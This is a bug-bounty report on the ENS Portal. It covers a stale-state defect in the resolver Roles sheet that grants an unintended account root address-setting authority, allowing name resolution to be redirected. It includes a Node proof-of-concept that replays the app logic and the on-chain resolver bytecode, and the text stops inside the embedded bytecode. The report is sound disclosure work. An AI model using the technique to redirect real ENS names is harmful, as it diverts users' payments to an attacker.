# 93129 w a critical stale role state tied to the row position in the resolver roles sheet quietly adds root role set addr to a grant so ens names resolve to an attacker controlled address

**Submitted on Sep 14th 2026 at 10:45:28 UTC by @deltabear for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #93129
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters Substituting contract addresses Submitting malicious transactions Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated) Inducing a blanket token approval (for example setApprovalForAll on the registry or NameWrapper) to an attacker-controlled address

## Description

## Brief/Intro

The Portal resolver Roles sheet re-seeds its editable permission map on the table row index, not on the account. An operator removes a role holder and then edits the account that shifts up into that index. The account written is read live and is the new account, but **the checkboxes still hold the removed account's roles** — the sheet presents account A's permission map under account B's identity, misrepresenting B's current roles. Relying on that incorrect pre-fill, the operator makes their one intended change and signs `grantRootRoles(ROLE_SET_ADDR | ROLE_SET_CONTENTHASH, B)` for account B, which held no address authority a moment earlier. B now sets the address record of every name the resolver serves, points them at B, and every payment sent to those names goes to B. The realized, irreversible harm — a name resolving to an attacker-controlled address — is Critical impact row 317-318; the role grant that causes it is revocable, but the redirected resolution and the funds paid to it are not.

## Vulnerability Details

The sheet reads the selected account live but re-seeds the editable permission map only when the table row id changes, and the row id is the array index.

`ResolverRolesSidebar.tsx:165-166` reads the account and its roles live off `row.original`. `ResolverRolesSidebar.tsx:181-184` re-seeds `editedPermissions` only inside `if (row && row.id !== prevRowId)`. `row.id` is the array index, because `DataTable.tsx:38-47` calls `useReactTable` with no `getRowId`, so TanStack Table v8 assigns `String(index)`.

Removing a holder shifts the indices. The role list is built in insertion order at `resolverRoles.ts:217-220`, so dropping one holder moves every later holder up one index. `removeUserMutation.onSuccess` refetches the list (`ResolverRolesSidebar.tsx:278-286`). The sheet stays mounted across the removal and the reopen: `onDone` closes it and resets neither `prevRowId` nor `editedPermissions` (`ResolverRolesSidebar.tsx:503-508`).

So when the operator reopens the index the removed holder vacated, `row.id` equals `prevRowId`, the re-seed at `:183` does not run, and `editedPermissions` still holds the removed holder's map. `computeRoleChanges` then diffs the new account's live roles against the old account's map (`ResolverRolesSidebar.tsx:186-193`), so Save is live with no input, and it emits the removed account's roles as grants (`rolesToPermissions.ts:80-102`). The account written is `selectedAccount`, the new account (`ResolverRolesSidebar.tsx:299-302`).

For a holder scoped to all names, `roleName` is `''` (`ResolverRolesSidebar.tsx:169`), so the grant runs with scope `root` (`grantResolverRoles.ts:45-61`), which ensjs encodes as `grantRootRoles(encodeResolverRoleBitmap(roles), account)` (`grantResolverRoles.js:22-27`). `ROLE_SET_ADDR` is `1<<0`, `ROLE_SET_CONTENTHASH` is `1<<8`, so the stale `ROLE_SET_ADDR` plus the operator's `ROLE_SET_CONTENTHASH` encode to `0x101`.

The app resets the right state on the wrong trigger. `useResetMutationsOnAccountChange.ts:13-21` runs an effect keyed on `selectedAccount`, the correct identity, and resets the two mutations, but never clears `editedPermissions` or `prevRowId`. Two sibling sheets re-seed on the row object and on `[open, currentRoles]` (`useEditedPermissions.ts:15-20`, `RegistryEditUserSheet.tsx:104-110`). This sheet keys on the index, and that is the defect.

This is not a "signed arguments differ from what is displayed" claim: the checkboxes the operator sees (Set Address, plus the Set Content Hash they tick) match the roles that get signed. The defect is one layer up — the **pre-filled baseline is account A's roles, not account B's**. A diligent operator who notices "Set Address" is checked is still deceived: the sheet asserts this is B's *existing* state, so the Set Address grant is unintended precisely because the operator was shown that B already held it. The roles table one layer up still shows B with only Set Text (its true roles), so the app simultaneously presents two contradictory states for B. The grant runs before the revoke (`ResolverRolesSidebar.tsx:212-238`), one signed step; the confirm modal names only the account, `Update roles for ${account}` (`ResolverRolesSidebar.tsx:345-349`), and does not re-list the roles.

On chain, `grantRootRoles` grants at the root resource. `setAddr` is gated on `ROLE_SET_ADDR` for the name's resource (`PermissionedResolver.sol:665-672`), and `_effectiveRoles` ORs the root resource roles into every resource (`EnhancedAccessControl.sol:453-455`), so a root grant satisfies that gate for every name.

### Vulnerable source code

**1. The account is read live, the edit map re-seeds on the row id** @ `apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:165-166,181-184`

```ts
  const selectedAccount = row?.original.account as Address
  const decodedRoles = (row?.original.decodedRoles ?? []) as ResolverRoleKey[]
...
  const [prevRowId, setPrevRowId] = useState<string | null>(null)
  if (row && row.id !== prevRowId) {
    setPrevRowId(row.id)
    setEditedPermissions(roleToPermissions(row.original.decodedRoles))
  }
```

**2. row\.id is the array index: the table has no getRowId** @ `apps/portal/src/components/DataTable.tsx:38-47`

```ts
  const table = useReactTable({
    data,
    columns,
    getCoreRowModel: getCoreRowModel(),
    onSortingChange: setSorting,
    getSortedRowModel: getSortedRowModel(),
    state: { sorting },
  })
```

**3. Remove user refetches the list, shifting every later holder up one index** @ `apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:278-286`

```ts
    onSuccess: async () => {
      await pollForIndexerSync({
        invalidateQueries: () =>
          queryClient.invalidateQueries({
            queryKey: ['resolver-overview'],
            refetchType: 'all',
          }),
      })
    },
```

**4. The write is computed from the new account's live roles against the stale map** @ `apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:186-193`

```ts
  const { rolesToGrant, rolesToRevoke } = computeRoleChanges(
    decodedRoles as string[],
    editedPermissions,
  )
```

**5. Root scope encodes to grantRootRoles(bitmap, account)** @ `@ensdomains/ensjs actions/wallet/v2/grantResolverRoles.js:22-27`

```js
            return {
                ...base,
                abi: permissionedResolverGrantRootRolesSnippet,
                functionName: 'grantRootRoles',
                args: [encodeResolverRoleBitmap(params.roles), params.targetAccount],
            };
```

**6. The reset hook watches the right identity but leaves the stale map** @ `apps/portal/src/features/roles/hooks/useResetMutationsOnAccountChange.ts:13-21`

```ts
  useEffect(() => {
    if (selectedAccount && !saveMutation.isPending && !removeUserMutation.isPending) {
      saveMutation.reset()
      removeUserMutation.reset()
    }
  }, [saveMutation.isPending, removeUserMutation.isPending, saveMutation.reset, removeUserMutation.reset, selectedAccount])
```

**7. The operator sees only the account before signing** @ `apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:345-349`

```ts
    .otherwise(() => ({
      id: SAVE_RESOLVER_ROLES_TX_ID,
      title: 'Save resolver role changes',
      transactionName: `Update roles for ${pendingAction?.account ?? ''}`,
    }))
```

**8. setAddr is gated on ROLE\_SET\_ADDR, and root roles apply to every name** @ `contracts-v2 @ 8d1c893 PermissionedResolver.sol:665-672, EnhancedAccessControl.sol:185-192`

```solidity
    function setAddr(bytes32 node, uint256 coinType, bytes memory addressBytes)
        public
        onlyPartRoles(node, PermissionedResolverLib.partHash(coinType), PermissionedResolverLib.ROLE_SET_ADDR)
    { ... }

    function hasRoles(uint256 resource, uint256 roleBitmap, address account) public view returns (bool) {
        return _effectiveRoles(resource, account) & roleBitmap == roleBitmap; // root roles OR in
    }
```

## Impact Details

This lands on one Critical row, quoted verbatim from the program's Impacts in Scope (scope.md:317-318):

> *"Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves"*

The governing clause names no attacker; its subject is **the application**. It requires that the app *display or pre-fill an incorrect transaction detail* and the user then *submit a transaction*. Both happen here, and the first "such as" bullet — *resolving an ENS name to an attacker-controlled address* — is the realized harm.

**The incorrect pre-fill.** When the operator reopens the row that B slid into, the permission editor is pre-filled with **account A's role map** (Set Address, at root) under **account B's identity**. That is an incorrect pre-filled transaction detail: it misrepresents B's current roles (B holds only Set Text). The operator makes their one intended change (tick Set Content Hash) and signs, relying on the app's representation of B's current state — and the transaction grants B root `ROLE_SET_ADDR` that B never held.

**Expected vs actual, before signing** (the reviewer's question, answered directly, and proven by the CONTROL run):

* *Expected:* reopening B's editor pre-fills **B's** current roles, `Set Text`. The operator adds Content Hash → the signed change grants Content Hash only; B ends `{Set Text, Content Hash}`, no address authority.
* *Actual:* the editor pre-fills **A's** roles, `Set Address`, under B's header. The operator's single added box makes the signed change `grant {Set Address, Content Hash}` and `revoke {Set Text}` → B ends holding root `Set Address`.
* *The displayed detail that differs from what is signed's effect:* the pre-filled checkbox baseline claims B currently holds `Set Address`; B does not. The roles **table** one layer up still shows B with only `Set Text`. The app presents two contradictory states for B, and the false one drives the grant.

This is explicitly **not** the "Modifying transaction arguments" row: the checkboxes the operator sees (Set Address + the Content Hash they tick) do match the roles signed. The defect is the pre-filled *baseline* being A's rather than B's — squarely the "pre-fill an incorrect transaction detail" clause above.

**The realized, irreversible harm.** Once B holds root `ROLE_SET_ADDR`, B calls `setAddr` on any name the resolver serves and points it at B; a standard forward resolution (`UniversalResolver` → `resolver.addr(node)`) then returns B, and any third party paying that name sends funds to B. The end-to-end PoC drives this in the shipped production Portal against the real audited resolver bytecode on an anvil fork: B's on-chain roles move from `0x10` (Set Text only) to holding `ROLE_SET_ADDR`, B repoints the name, and a customer's **real value transfer** to the resolved address lands with B.

**B gains authority it did not have.** Before: B holds `ROLE_SET_TEXT` (bitmap `0x10`) and `setAddr` reverts on the real on-chain gate. After: B holds root `ROLE_SET_ADDR` over every name the resolver serves. This 0 → root address-authority delta is the fact the downgraded sibling #91602 lacked ("does not create authority the controller did not already hold"); here it is created, and the harm is realized on-chain.

**Trigger and revocability (stated honestly).** B needs no privilege and takes no step to trigger this — B is the ordinary low-role delegate the operator was about to edit. B cannot *schedule* the trigger; it fires on the operator's own routine sequence (remove a departing holder, then edit the next holder in the list). This is a system-caused misdirection off a normal operator workflow, the same actor structure the program's already-VALIDATED sibling Critical (`VALIDATED-poc-portal-transfer-stale-recipient-resolution`) carries on this exact row. The role grant is revocable, but the redirected resolution and the funds paid to it before anyone notices are not — revoking B's role afterward does not return them.

Dedup note: QA-01, WEB-1257 and WEB-1305 cover role combinations that make later actions error. The program's own carve-out (`scope.md:204`): *"a demonstrated security consequence of one of them (for example, a role combination that grants authority it should not, rather than merely erroring) goes beyond the known breakage and is a new finding."*

## References

* `apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:165-166` - account and roles read live off `row.original`
* `apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:181-184` - `editedPermissions` re-seeded only when `row.id` changes
* `apps/portal/src/components/DataTable.tsx:38-47` - `useReactTable` with no `getRowId`, so `row.id` is the array index
* `apps/portal/src/lib/roles/resolverRoles.ts:217-220` - the holder list is returned in insertion order
* `apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:278-286` - Remove user refetches `resolver-overview`
* `apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:503-508` - `onDone` resets neither `prevRowId` nor `editedPermissions`
* `apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:186-193` - diff of the new account's roles against the stale map
* `apps/portal/src/lib/roles/rolesToPermissions.ts:80-102` - `computeRoleChanges` emits the stale roles as grants
* `apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:299-302,212-238` - account written is `selectedAccount`, grant runs before revoke
* `apps/portal/src/features/resolver/helpers/grantResolverRoles.ts:45-61` - `name === ''` selects scope `root`
* `@ensdomains/ensjs actions/wallet/v2/grantResolverRoles.js:22-27` - root scope encodes `grantRootRoles(encodeResolverRoleBitmap(roles), account)`
* `apps/portal/src/features/roles/hooks/useResetMutationsOnAccountChange.ts:13-21` - watches `selectedAccount`, resets mutations, not `editedPermissions`
* `apps/portal/src/features/roles/hooks/useEditedPermissions.ts:15-20` - sibling re-seeds on the row object
* `apps/portal/src/features/registry/components/v2/RegistryEditUserSheet.tsx:104-110` - sibling re-seeds on `[open, currentRoles]`
* `apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:345-349` - confirm step names only the account
* `contracts-v2 @ 8d1c893 PermissionedResolver.sol:665-672` - `setAddr` gated on `ROLE_SET_ADDR` for the name's resource
* `contracts-v2 @ 8d1c893 EnhancedAccessControl.sol:185-192,453-455` - `_effectiveRoles` ORs root resource roles into every resource

## Proof of Concept

```bash
node poc.mjs
```

### poc.mjs

```js
#!/usr/bin/env node
//
// The Portal resolver Roles sheet re-seeds its editable permission map on the
// table ROW INDEX, not the account. Remove a holder, reopen the index that
// shifts up, and the sheet builds grantRootRoles(ROLE_SET_ADDR | X, B) for an
// account that had no address authority. B then setAddr's every name the
// resolver serves and collects the payments.
//
//   node poc.mjs
//
// Self-contained. On first run it writes helpers to a temp dir, installs pinned
// deps and re-execs. Nothing runs before it.
//
// LAYER A is the target's OWN code: computeRoleChanges + roleToPermissions from
// apps/portal, the real @tanstack/table-core with DataTable.tsx's option set,
// and ensjs's own grantResolverRolesWriteParameters. They rebuild the calldata;
// this asserts it equals the bytes the shipped app put on the wire.
// LAYER B runs the REAL audited PermissionedResolver bytecode (contracts-v2 @
// 8d1c893, forge-compiled, embedded below) on a real EVM, driven by Layer A's
// calldata. No model contract.

import { spawnSync } from 'node:child_process'
import { existsSync, mkdirSync, writeFileSync } from 'node:fs'
import { createRequire } from 'node:module'
import os from 'node:os'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

const HERE = path.dirname(fileURLToPath(import.meta.url))
const REPO = process.env.ENS_REPO ?? path.resolve(HERE, '../../../ens-apps')
const WORK = process.env.POC_WORKDIR ?? path.join(os.tmpdir(), 'ens-poc-roles-reseed-real')

// grantRootRoles(uint256 roles, address account): roles = 0x101, account = B.
// captured off the wire in the shipped Portal (evidence-manageronly/run.log).
const CAPTURED =
  '0x072d5d770000000000000000000000000000000000000000000000000000000000000101' +
  '000000000000000000000000bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbeef'

const OPERATOR  = '0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266' // resolver admin, signs the grant
const ALICEOWN  = '0x000000000000000000000000000000000000a11c' // owns alice.eth
const BOBOWN    = '0x000000000000000000000000000000000000b0b0' // owns bob.eth
const CUSTOMER  = '0x00000000000000000000000000000000000000c1' // pays alice.eth

const PKG = "{\n  \"name\": \"ens-poc-roles-reseed-real\",\n  \"private\": true,\n  \"type\": \"module\",\n  \"dependencies\": {\n    \"@ensdomains/ensjs\": \"https://pkg.pr.new/ensdomains/ensjs/@ensdomains/ensjs@e96662c\",\n    \"@ensdomains/ensjs-abi\": \"https://pkg.pr.new/ensdomains/ensjs/@ensdomains/ensjs-abi@e96662c\",\n    \"@tanstack/table-core\": \"8.21.3\",\n    \"@ethereumjs/common\": \"^4.4.0\",\n    \"@ethereumjs/evm\": \"^3.1.0\",\n    \"@ethereumjs/statemanager\": \"^2.4.0\",\n    \"@ethereumjs/util\": \"^9.1.0\",\n    \"viem\": \"2.52.2\"\n  },\n  \"devDependencies\": {\n    \"tsx\": \"^4.19.2\"\n  }\n}"

const LOADER = `import path from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'
const HERE = path.dirname(fileURLToPath(import.meta.url))
const ANCHOR = pathToFileURL(path.join(HERE, 'poc.mjs')).href
const REPO = process.env.ENS_REPO
const isBare = (s) => !s.startsWith('.') && !s.startsWith('/') && !s.includes(':')
const REPO_PREFIX = path.resolve(REPO).toLowerCase() + path.sep
const isRepoFile = (u) => {
  if (!u || !u.startsWith('file:')) return false
  try { return path.resolve(fileURLToPath(u)).toLowerCase().startsWith(REPO_PREFIX) } catch { return false }
}
export async function resolve(specifier, context, nextResolve) {
  if (specifier.startsWith('@ens-repo/'))
    return nextResolve(pathToFileURL(path.join(REPO, specifier.slice(10))).href, context)
  if (isRepoFile(context.parentURL) && isBare(specifier))
    return nextResolve(specifier, { ...context, parentURL: ANCHOR })
  return nextResolve(specifier, context)
}
`

const REGISTER = `import { register } from 'node:module'
register('./_loader.mjs', import.meta.url)
`

// ============================================================== bootstrap
if (process.env.ENS_POC_CHILD !== '1') {
  const line = '='.repeat(78)
  console.log(line)
  console.log('  ENS PoC: resolver Roles sheet grants root setAddr to a zero-authority')
  console.log('           account; the attacker collects the payments')
  console.log('  contract leg runs the REAL audited PermissionedResolver bytecode')
  console.log(line)
  if (!existsSync(path.join(REPO, 'apps', 'portal', 'src', 'lib', 'roles', 'rolesToPermissions.ts'))) {
    console.error('\nERROR: ENS checkout not found at ' + REPO + '. Set ENS_REPO.')
    process.exit(2)
  }
  mkdirSync(WORK, { recursive: true })
  writeFileSync(path.join(WORK, 'package.json'), PKG)
  writeFileSync(path.join(WORK, '_loader.mjs'), LOADER)
  writeFileSync(path.join(WORK, '_register.mjs'), REGISTER)
  const { copyFileSync } = await import('node:fs')
  copyFileSync(fileURLToPath(import.meta.url), path.join(WORK, 'poc.mjs'))
  if (!existsSync(path.join(WORK, 'node_modules', 'tsx', 'package.json'))) {
    console.log('\nInstalling pinned deps (viem 2.52.2, ensjs @e96662c, table-core 8.21.3, @ethereumjs/evm)...')
    const r = spawnSync('npx', ['--yes', 'pnpm@9', 'install', '--no-frozen-lockfile'],
      { cwd: WORK, stdio: 'inherit', shell: true })
    if (r.status !== 0) process.exit(r.status ?? 1)
  }
  const r = spawnSync(process.execPath,
    ['--import', 'tsx', '--import', './_register.mjs', 'poc.mjs'],
    { cwd: WORK, stdio: 'inherit',
      env: { ...process.env, ENS_POC_CHILD: '1', ENS_REPO: REPO, NODE_NO_WARNINGS: '1' } })
  process.exit(r.status ?? 1)
}

// ============================================================== layer A
const { roleToPermissions, hasPermissionsChanged, computeRoleChanges } = await import(
  '@ens-repo/apps/portal/src/lib/roles/rolesToPermissions.ts')
const { createTable, getCoreRowModel, getSortedRowModel } = await import('@tanstack/table-core')
const { grantResolverRolesWriteParameters } = await import('@ensdomains/ensjs/wallet/v2')
const { encodeAbiParameters, encodeFunctionData, decodeErrorResult, decodeFunctionResult,
        formatEther, getAddress, namehash } = await import('viem')
const { sepolia } = await import('viem/chains')

const B = getAddress('0x' + CAPTURED.slice(-40))

// DataTable.tsx option set, no getRowId, so row.id is the array index.
const buildTable = (data) => {
  let sorting = []
  const t = createTable({
    data, columns: [{ id: 'user', accessorKey: 'account' }],
    getCoreRowModel: getCoreRowModel(),
    onSortingChange: (u) => { sorting = typeof u === 'function' ? u(sorting) : u },
    getSortedRowModel: getSortedRowModel(),
    state: { sorting }, renderFallbackValue: null, onStateChange: () => {},
  })
  t.setOptions((prev) => ({ ...prev, state: { ...t.initialState, sorting } }))
  return t
}
const rowsOf = (data) => buildTable(data).getRowModel().rows

const A = '0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdead'
const C = '0xCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCc0de'
const startList = () => [
  { account: C, decodedRoles: ['ROLE_SET_TEXT'] },
  { account: A, decodedRoles: ['ROLE_SET_ADDR'] },
  { account: B, decodedRoles: ['ROLE_SET_TEXT'] },
]

const replaySheet = (openIndexAfterRemoval) => {
  let prevRowId = null
  let editedPermissions = new Map()
  const openSheet = (row) => {
    if (row.id !== prevRowId) { prevRowId = row.id; editedPermissions = roleToPermissions(row.original.decodedRoles) }
    return editedPermissions
  }
  let rows = rowsOf(startList())
  openSheet(rows.find((r) => r.original.account === A))
  rows = rowsOf(startList().filter((r) => r.account !== A))
  editedPermissions = openSheet(rows[openIndexAfterRemoval])
  const stale = new Map(editedPermissions)
  stale.set('ROLE_SET_CONTENTHASH', { admin: false, manager: true })
  const original = roleToPermissions(rows[openIndexAfterRemoval].original.decodedRoles)
  return {
    account: rows[openIndexAfterRemoval].original.account,
    liveRoles: rows[openIndexAfterRemoval].original.decodedRoles,
    saveLiveWithZeroInput: hasPermissionsChanged(original, editedPermissions),
    ...computeRoleChanges(rows[openIndexAfterRemoval].original.decodedRoles, stale),
  }
}

const buildCalldata = (account, rolesToGrant) => {
  const wp = grantResolverRolesWriteParameters(
    { chain: sepolia, account: { address: OPERATOR } },
    { resolverAddress: '0x9999999999999999999999999999999999999999',
      targetAccount: account, scope: 'root', roles: rolesToGrant })
  return encodeFunctionData({ abi: wp.abi, functionName: wp.functionName, args: wp.args })
}

// ============================================================== EVM (real bytecode)
const { Common, Hardfork } = await import('@ethereumjs/common')
const { EVM } = await import('@ethereumjs/evm')
const { DefaultStateManager } = await import('@ethereumjs/statemanager')
const { Account, Address, hexToBytes } = await import('@ethereumjs/util')

const RESOLVER_ABI = [{"type":"constructor","inputs":[{"name":"namer","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"function","name":"addr","inputs":[{"name":"node","type":"bytes32","internalType":"bytes32"}],"outputs":[{"name":"","type":"address","internalType":"address payable"}],"stateMutability":"view"},{"type":"function","name":"grantRootRoles","inputs":[{"name":"roleBitmap","type":"uint256","internalType":"uint256"},{"name":"account","type":"address","internalType":"address"}],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"nonpayable"},{"type":"function","name":"hasRoles","inputs":[{"name":"resource","type":"uint256","internalType":"uint256"},{"name":"roleBitmap","type":"uint256","internalType":"uint256"},{"name":"account","type":"address","internalType":"address"}],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"initialize","inputs":[{"name":"admin","type":"address","internalType":"address"},{"name":"roleBitmap","type":"uint256","internalType":"uint256"},{"name":"setters","type":"bytes[]","internalType":"bytes[]"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"roles","inputs":[{"name":"resource","type":"uint256","internalType":"uint256"},{"name":"account","type":"address","internalType":"address"}],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"setAddr","inputs":[{"name":"node","type":"bytes32","internalType":"bytes32"},{"name":"addr_","type":"address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"error","name":"AddressEmptyCode","inputs":[{"name":"target","type":"address","internalType":"address"}]},{"type":"error","name":"DNSDecodingFailed","inputs":[{"name":"dns","type":"bytes","internalType":"bytes"}]},{"type":"error","name":"EACCannotGrantRoles","inputs":[{"name":"resource","type":"uint256","internalType":"uint256"},{"name":"roleBitmap","type":"uint256","internalType":"uint256"},{"name":"account","type":"address","internalType":"address"}]},{"type":"error","name":"EACCannotRevokeRoles","inputs":[{"name":"resource","type":"uint256","internalType":"uint256"},{"name":"roleBitmap","type":"uint256","internalType":"uint256"},{"name":"account","type":"address","internalType":"address"}]},{"type":"error","name":"EACInvalidAccount","inputs":[]},{"type":"error","name":"EACInvalidRoleBitmap","inputs":[{"name":"roleBitmap","type":"uint256","internalType":"uint256"}]},{"type":"error","name":"EACMaxAssignees","inputs":[{"name":"resource","type":"uint256","internalType":"uint256"},{"name":"role","type":"uint256","internalType":"uint256"}]},{"type":"error","name":"EACMinAssignees","inputs":[{"name":"resource","type":"uint256","internalType":"uint256"},{"name":"role","type":"uint256","internalType":"uint256"}]},{"type":"error","name":"EACRootResourceNotAllowed","inputs":[]},{"type":"error","name":"EACUnauthorizedAccountRoles","inputs":[{"name":"resource","type":"uint256","internalType":"uint256"},{"name":"roleBitmap","type":"uint256","internalType":"uint256"},{"name":"account","type":"address","internalType":"address"}]},{"type":"error","name":"ERC1967InvalidImplementation","inputs":[{"name":"implementation","type":"address","internalType":"address"}]},{"type":"error","name":"ERC1967NonPayable","inputs":[]},{"type":"error","name":"FailedCall","inputs":[]},{"type":"error","name":"InvalidContentType","inputs":[{"name":"contentType","type":"uint256","internalType":"uint256"}]},{"type":"error","name":"InvalidEVMAddress","inputs":[{"name":"addressBytes","type":"bytes","internalType":"bytes"}]},{"type":"error","name":"InvalidInitialization","inputs":[]},{"type":"error","name":"NotInitializing","inputs":[]},{"type":"error","name":"UUPSUnauthorizedCallContext","inputs":[]},{"type":"error","name":"UUPSUnsupportedProxiableUUID","inputs":[{"name":"slot","type":"bytes32","internalType":"bytes32"}]},{"type":"error","name":"UnsupportedResolverProfile","inputs":[{"name":"selector","type":"bytes4","internalType":"bytes4"}]}]
const RESOLVER_BYTECODE = '0x60a060405230608052348015610013575f5ffd5b50604051614112380380614112833981016040819052610032916103c2565b61005e5f7f0100000000000000000000000000000001000000000000000000000000000000838261006d565b50610067610168565b50610429565b5f835f0361007c57505f610160565b61008584610205565b6001600160a01b0383166100ac5760405163761fe2c960e11b815260040160405180910390fd5b5f858152602081815260408083206001600160a01b038716845290915290205484811780821461015a575f878152602081815260408083206001600160a01b03891684529091529020819055811986166101088882600161024e565b60408051848152602081018490526001600160a01b038816918a917f0d35bf721a39b614de00ca5038e1deb0cb0c69a278645e83405a7226cf80ba3c910160405180910390a360019350505050610160565b5f925050505b949350505050565b5f61017161037e565b805490915068010000000000000000900460ff16156101a35760405163f92ee8a960e01b815260040160405180910390fd5b80546001600160401b03908116146102025780546001600160401b0319166001600160401b0390811782556040519081527fc7f505b2f371ae2175ee4913f4499e1f2633a7b5936321eed1cdaeb6115181d29060200160405180910390a15b50565b7feeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee81161561020257604051630153d96960e51b8152600481018290526024015b60405180910390fd5b5f610258836103a8565b905081156102ee575f8481526001602052604090205461029e9082161980195f5160206140f25f395f51905f5291909101165f5160206140d25f395f51905f5216151590565b156102c657604051631f22ca6960e31b81526004810185905260248101849052604401610245565b5f84815260016020526040812080548592906102e3908490610403565b909155506103789050565b5f8481526001602052604090205461032d901982161980195f5160206140f25f395f51905f5291909101165f5160206140d25f395f51905f5216151590565b1561035557604051631f80c19b60e01b81526004810185905260248101849052604401610245565b5f8481526001602052604081208054859290610372908490610416565b90915550505b50505050565b5f807ff0c57e16840df040f15088dc2f81fe391c3923bec73e23a9662efc9c229c6a005b92915050565b5f6103b282610205565b50600181901b17600281901b1790565b5f602082840312156103d2575f5ffd5b81516001600160a01b03811681146103e8575f5ffd5b9392505050565b634e487b7160e01b5f52601160045260245ffd5b808201808211156103a2576103a26103ef565b818103818111156103a2576103a26103ef565b608051613c8361044f5f395f818161257b015281816125a401526126ed0152613c835ff3fe6080604052600436106102a5575f3560e01c8063691f34311161016f578063c80ef4e0116100d8578063dfa70d8b11610092578063ecbfada31161006d578063ecbfada3146108cf578063f1cb7e06146108ee578063f2d1eb251461090d578063f41a143d1461092c575f5ffd5b8063dfa70d8b14610872578063e32954eb14610891578063e59d895d146108b0575f5ffd5b8063c80ef4e01461078a578063c8690233146107a9578063ce156e82146107c8578063d3bf89b1146107e7578063d5fa2b0014610806578063d700ff3314610825575f5ffd5b80638b95dd71116101295780638b95dd71146106b25780639061b923146106d1578063ac9650d8146106f0578063ad3cb1cc1461071c578063bbd9abb51461074c578063bc1c58d11461076b575f5ffd5b8063691f3431146105f85780636f3ff726146106175780637058b559146106365780637737221314610655578063781ef8db146106745780637c30058614610693575f5ffd5b806332f111d71161021157806352d1902d116101cb57806352d1902d1461052b578063582de3e71461053f578063587eefd11461056f57806359d1d43c1461058e5780635adf4724146105ba578063623195b0146105d9575f5ffd5b806332f111d7146104685780633603d758146104875780633634f911146104a65780633b3b57de146104da5780634eb9c45e146104f95780634f1ef28614610518575f5ffd5b80631c3fc3eb116102625780631c3fc3eb146103925780632203ab56146103b3578063291770ae146103e057806329cd62ea146103ff5780632f27fa241461041e578063304e6ade14610449575f5ffd5b806301ffc9a7146102a9578063072d5d77146102dd57806310f13a8c146102fc57806311b8e00a1461031d578063124a319c1461033c5780631a76b72c14610373575b5f5ffd5b3480156102b4575f5ffd5b506102c86102c3366004612fde565b61094c565b60405190151581526020015b60405180910390f35b3480156102e8575f5ffd5b506102c86102f736600461300d565b610b41565b348015610307575f5ffd5b5061031b610316366004613074565b610b65565b005b348015610328575f5ffd5b506102c86103373660046130eb565b610c8c565b348015610347575f5ffd5b5061035b61035636600461310b565b610ca3565b6040516001600160a01b0390911681526020016102d4565b34801561037e575f5ffd5b506102c861038d36600461313b565b610d00565b34801561039d575f5ffd5b506103a55f81565b6040519081526020016102d4565b3480156103be575f5ffd5b506103d26103cd3660046130eb565b610e55565b6040516102d49291906131f6565b3480156103eb575f5ffd5b5061031b6103fa36600461320e565b610f53565b34801561040a575f5ffd5b5061031b610419366004613278565b611036565b348015610429575f5ffd5b506103a56104383660046132a1565b5f9081526001602052604090205490565b348015610454575f5ffd5b5061031b6104633660046132b8565b6110bc565b348015610473575f5ffd5b506102c86104823660046130eb565b611118565b348015610492575f5ffd5b5061031b6104a13660046132a1565b61114a565b3480156104b1575f5ffd5b506104c56104c03660046130eb565b6111f6565b604080519283526020830191909152016102d4565b3480156104e5575f5ffd5b5061035b6104f43660046132a1565b611219565b348015610504575f5ffd5b5061031b610513366004613074565b611237565b61031b6105263660046133bb565b611368565b348015610536575f5ffd5b506103a5611387565b34801561054a575f5ffd5b506102c8610559366004612fde565b6001600160e01b0319166312d6c5b760e31b1490565b34801561057a575f5ffd5b506102c8610589366004613405565b6113a2565b348015610599575f5ffd5b506105ad6105a83660046132b8565b61149a565b6040516102d4919061346d565b3480156105c5575f5ffd5b506103a56105d436600461300d565b611557565b3480156105e4575f5ffd5b5061031b6105f336600461347f565b611562565b348015610603575f5ffd5b506105ad6106123660046132a1565b611601565b348015610622575f5ffd5b506102c86106313660046134b5565b61169d565b348015610641575f5ffd5b5061031b61065036600461350e565b6116ac565b348015610660575f5ffd5b5061031b61066f3660046132b8565b6117bd565b34801561067f575f5ffd5b506102c861068e36600461300d565b61181e565b34801561069e575f5ffd5b506102c86106ad366004613557565b611834565b3480156106bd575f5ffd5b5061031b6106cc366004613589565b611854565b3480156106dc575f5ffd5b506105ad6106eb36600461320e565b61198f565b3480156106fb575f5ffd5b5061070f61070a3660046135d4565b611c5e565b6040516102d49190613612565b348015610727575f5ffd5b506105ad604051806040016040528060058152602001640352e302e